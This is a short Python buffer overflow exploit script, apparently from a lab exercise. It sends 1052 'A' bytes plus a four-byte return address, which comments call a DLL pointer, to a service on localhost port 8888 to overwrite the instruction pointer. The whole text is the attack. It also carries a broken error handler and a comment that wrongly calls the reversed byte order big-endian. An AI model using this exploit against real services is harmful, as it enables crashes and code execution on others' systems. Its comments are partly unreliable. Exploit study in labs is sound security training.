import sys
import socket

junk  = "A" * 1052 + "\x7b\x8a\xa9\x68"

# Establish Connection and Send Junk
try:
	conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	conn.connect(("127.0.0.1",8888))
	conn.send(junk)
	conn.close()
	sys.exit()
except Exception as error:
	print("Error Occur " + error)

## DLL Pointer Address = 68a98a7b ( Little Endian )
## DLL Pointer Address in Big Endian = \x7b\x8a\xa9\x68